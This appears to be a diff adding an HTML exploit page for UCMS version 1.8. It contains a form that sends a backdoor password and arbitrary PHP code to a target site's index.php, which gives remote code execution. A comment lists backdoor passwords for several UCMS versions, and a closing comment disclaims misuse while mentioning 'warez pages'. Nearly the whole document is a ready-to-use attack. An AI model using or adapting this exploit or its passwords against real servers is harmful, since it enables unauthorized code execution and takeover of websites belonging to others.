@@ -1,0 +1,46 @@
+&lt;head&gt;
+&lt;title&gt;Ucms v. 1.8 Np exploit&lt;/title&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+function sethost(seite)
+{
+document.host.action = seite + &#039;index.php?&amp;q=test&amp;e=1&#039;;
+document.all.data.innerHTML =  document.host.action;
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onLoad=&quot;sethost(&#039;http://www.example.com/&#039;)&quot; &gt;
+&lt;h1&gt;Ucms v. 1.8 Np exploit&lt;/h1&gt;
+Actual Request:&lt;div id=&quot;data&quot;&gt;&lt;/div&gt;
+&lt;br /&gt;
+Host:&lt;input type=&quot;text&quot; value=&quot;http://www.ucmspage.de/&quot; 
+onKeyUp=&quot;sethost(this.value);&quot; /&gt;
+&lt;form id=&quot;host&quot; name=&quot;host&quot; action=&quot;http://www.ucmspage.de/&quot; 
+method=&quot;POST&quot;&gt;
+Password:&lt;input type=&quot;text&quot; name=&quot;p&quot; value=&quot;ZCShY8FjtEhIF8LZ&quot;&gt;&lt;br /&gt;
+&lt;!--
+Additional info:
+You need a password to activate the backdoor we found these passwords:
+ZCShY8FjtEhIF8LZ (UCMS 1.8)
+mYM1NHtWtZk2KwrF (UCMS 1.4)
+wVCQUyhTga5Nmft1 (UCMS [?])
+Just go into the file or similar files to find the passwords,
+ for every version there is another password
+--&gt;
+ 
+Phpcode:&lt;br /&gt;
+&lt;textarea name=&quot;e&quot; rows=&quot;20&quot; cols=&quot;100&quot;&gt;
+phpinfo(); ?&gt;
+&lt;/textarea&gt;
+&lt;br /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;exploit&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+
+&lt;!--
+It´s just a crime to do such thigs, so please use
+this exploit just for knowledge and not to destroy the warez pages...
+thank you for you attention...
+Have a nice day
+--&gt;
+
+&lt;/html&gt;
